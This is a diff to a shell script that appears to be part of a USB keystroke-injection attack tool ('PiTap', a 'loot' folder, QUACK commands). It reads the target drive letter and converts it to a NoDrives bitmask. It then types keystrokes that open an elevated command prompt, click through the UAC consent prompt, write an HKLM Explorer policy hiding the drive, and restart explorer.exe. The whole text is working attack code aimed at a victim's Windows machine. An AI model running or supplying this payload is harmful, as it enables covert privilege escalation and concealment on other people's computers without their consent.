@@ -28,95 +28,99 @@ umount /PiTap/mnt
 # Hide the drive
 drive=$(</PiTap/loot/DRIVE_LETTER)
 
-case $drive in
-	A:)
+case ${drive::1} in
+	A)
 		drive_id="1"
 		;;
-	B:)
+	B)
 		drive_id="2"
 		;;
-	C:)
+	C)
 		drive_id="4"
 		;;
-	D:)
+	D)
 		drive_id="8"
 		;;
-	E:)
+	E)
 		drive_id="16"
 		;;
-	F:)
+	F)
 		drive_id="32"
 		;;
-	G:)
+	G)
 		drive_id="64"
 		;;
-	H:)
+	H)
 		drive_id="128"
 		;;
-	I:)
+	I)
 		drive_id="256"
 		;;
-	J:)
+	J)
 		drive_id="512"
 		;;
-	K:)
+	K)
 		drive_id="1024"
 		;;
-	L:)
+	L)
 		drive_id="2048"
 		;;
-	M:)
+	M)
 		drive_id="4096"
 		;;
-	N:)
+	N)
 		drive_id="8192"
 		;;
-	O:)
+	O)
 		drive_id="16384"
 		;;
-	P:)
+	P)
 		drive_id="32768"
 		;;
-	Q:)
+	Q)
 		drive_id="65536"
 		;;
-	R:)
+	R)
 		drive_id="131072"
 		;;
-	S:)
+	S)
 		drive_id="262144"
 		;;
-	T:)
+	T)
 		drive_id="524288"
 		;;
-	U:)
+	U)
 		drive_id="1048576"
 		;;
-	V:)
+	V)
 		drive_id="2097152"
 		;;
-	W:)
+	W)
 		drive_id="4194304"
 		;;
-	X:)
+	X)
 		drive_id="8388608"
 		;;
-	Y:)
+	Y)
 		drive_id="16777216"
 		;;
-	Z:)
+	Z)
 		drive_id="33554432"
 		;;
 esac
 
 QUACK GUI r
-QUACK DELAY 50
-QUACK STRING cmd
+QUACK STRING "cmd"
 QUACK CTRL-SHIFT ENTER
 QUACK DELAY 500
-QUACK ALT-SHIFT TAB
-QUACK DELAY 50
+QUACK LEFTARROW
+QUACK ENTER
+QUACK DELAY 5
 QUACK STRING "REG ADD \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /t REG_DWORD /v NoDrives /d \"${drive_id}\" /f"
+QUACK ENTER
+QUACK STRING "taskkill /f /im explorer.exe"
+QUACK ENTER
+QUACK STRING "explorer.exe"
 QUACK ENTER
 QUACK STRING "exit"
 QUACK ENTER
